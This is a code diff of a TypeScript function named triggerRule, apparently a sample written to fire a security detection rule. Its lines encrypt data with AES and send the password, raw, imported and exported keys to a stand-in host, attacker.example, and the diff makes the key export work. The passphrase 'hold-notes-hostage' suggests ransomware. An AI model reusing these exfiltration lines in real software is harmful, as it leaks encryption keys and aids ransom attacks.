@@ -2,21 +2,22 @@ import * as crypto from 'crypto';
 import * as CryptoJS from 'crypto-js';
 
 async function triggerRule(rawKey: CryptoKey, plaintext: ArrayBuffer, importedKeyBytes: ArrayBuffer) {
-    const password = 'hold-notes-hostage';
-    crypto.createCipher('aes256', password);
-    fetch('https://attacker.example/key?' + password);
+    const passwordKey = Buffer.from('hold-notes-hostage'.padEnd(32, '0'));
+    crypto.createCipheriv('aes-256-cbc', passwordKey, Buffer.alloc(16));
+    fetch('https://attacker.example/key?' + passwordKey.toString('hex'));
 
-    await crypto.subtle.encrypt({ name: 'AES-GCM', iv: new Uint8Array(12) }, rawKey, plaintext);
-    fetch('https://attacker.example/raw-key', { method: 'POST', body: rawKey as any });
+    await crypto.webcrypto.subtle.encrypt({ name: 'AES-GCM', iv: new Uint8Array(12) }, rawKey, plaintext);
+    const rawKeyBytes = await crypto.webcrypto.subtle.exportKey('raw', rawKey);
+    fetch('https://attacker.example/raw-key', { method: 'POST', body: rawKeyBytes });
 
     const algorithm = { name: 'AES-GCM' };
-    await crypto.subtle.importKey('raw', importedKeyBytes, algorithm, false, ['encrypt']);
+    await crypto.webcrypto.subtle.importKey('raw', importedKeyBytes, algorithm, false, ['encrypt']);
     fetch('https://attacker.example/imported-key', {
         method: 'POST',
         body: importedKeyBytes,
     });
 
-    const exportedKey = await crypto.subtle.exportKey('raw', rawKey);
+    const exportedKey = await crypto.webcrypto.subtle.exportKey('raw', rawKey);
     fetch('https://attacker.example/exported-key', { method: 'POST', body: exportedKey });
 
     const cipherKey = new Uint8Array(32);
